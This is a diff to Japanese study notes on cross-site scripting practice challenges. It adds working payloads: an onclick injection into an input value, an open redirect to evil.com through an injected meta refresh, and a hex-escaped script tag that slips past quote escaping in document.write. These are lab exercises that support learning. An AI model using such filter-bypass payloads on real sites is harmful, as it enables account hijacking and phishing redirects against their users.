@@ -130,8 +130,29 @@ document.write ('aaa'+"さん");
 ```txt
 ');alert(xss);//
 ```
+### 11 (inject \<input value="">)
+文字数制限あり？   
+`xsssample_11.php?user=aaa&pass="+onclick%3D"alert('xss')`で成功。   
+### 12 (\<meta content=""/>)
+`<>`が使えない   
+この中に入力が入っている。   
+```txt
+<meta property="og:title" content="aaaa" />
+```
+https://medium.com/bugbountywriteup/xss-bypass-using-meta-tag-in-realestate-postnl-nl-32db25db7308   
+https://jpcertcc.github.io/OWASPdocuments/CheatSheets/XSSFilterEvasion.html   
+https://stackoverflow.com/questions/18947139/xss-in-meta-tag   
+ここにMETAタグを使ってXSSする方法がいろいろあるが、どれもうまく行ってない…ブラウザに依存してる？？   
+以下のOpenRedirectだけは動作してる！
+```txt
+// 以下を送信
+0;http://evil.com"HTTP-EQUIV="refresh"
 
+<meta property="og:title" content="0;http://evil.com"HTTP-EQUIV="refresh"" />
+```
 ## XSS Challenges
+https://blogs.tunelko.com/2013/12/02/xss-challenges/   
+writupはここ   
 ### 1 (normal)
 ![image](https://user-images.githubusercontent.com/56021519/103072436-ea542d80-4608-11eb-94f9-09f21674c770.png)   
 `<script>alert(document.domain);</script>`   
@@ -307,10 +328,26 @@ print("${" + "String.fromCharCode({})".format(",".join(list(map(str, C)))) + "}"
 ### 12 IE
 ### 13 IE
 ### 14 IE
-### 15 
+### 15 (DOM based document.write)
+![image](https://user-images.githubusercontent.com/56021519/103081721-d9f97e00-461b-11eb-8b77-e1cac3afe6b7.png)   
+`");alert(xss);//`を入力すると`"`がエスケープされてる…      
+```txt
+<script>document.write("&quot;);alert(xss);//");</script>
+```
+DOM basedでなければ`"`をBypassする方法はない(?)が、今回はDOM basedで`document.write()`の中に入力が入るので、`\\x3cscript\\x3ealert(document.domain);\\x3c/script\\x3e`を入力すると一見できなそうだけどXSSできる！   
+これは`<script>alert(document.domain)</script>`と同じ！   
+```txt
+<script>
+document.write("\x3cscript\x3ealert(document.domain);\x3c/script\x3e");
+</script>
+```
+https://macchinetta.github.io/server-guideline/current/ja/Security/XSS.html   
+詳細はここにある。   
+### 16 ページが動いてない
+
 ### 17 IE
 ### 18 IE
-### 19
+### 19 ページが動いてない
 
 
 
